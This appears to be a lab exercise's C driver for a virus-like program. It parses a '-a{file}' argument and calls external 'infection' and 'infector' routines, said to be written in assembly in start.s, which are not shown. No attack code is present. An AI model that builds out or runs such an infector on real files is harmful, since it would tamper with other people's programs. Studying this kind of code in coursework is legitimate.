/* No libc: output and attachment are implemented in start.s. */
extern int system_call(int number, int fd, const char *buffer, unsigned int count);
extern void infection(void);
extern void infector(char *filename);

int main(int argc, char *argv[])
{
    char *filename;
    if (argc != 2 || argv[1][0] != '-' || argv[1][1] != 'a' ||
        argv[1][2] == '\0') {
        static const char usage[] = "Usage: ./run_program -a{file}\n";
        system_call(4, 2, usage, sizeof(usage) - 1);
        return 0x55;
    }
    filename = argv[1] + 2;
    infection();
    infector(filename);
    return 0;
}
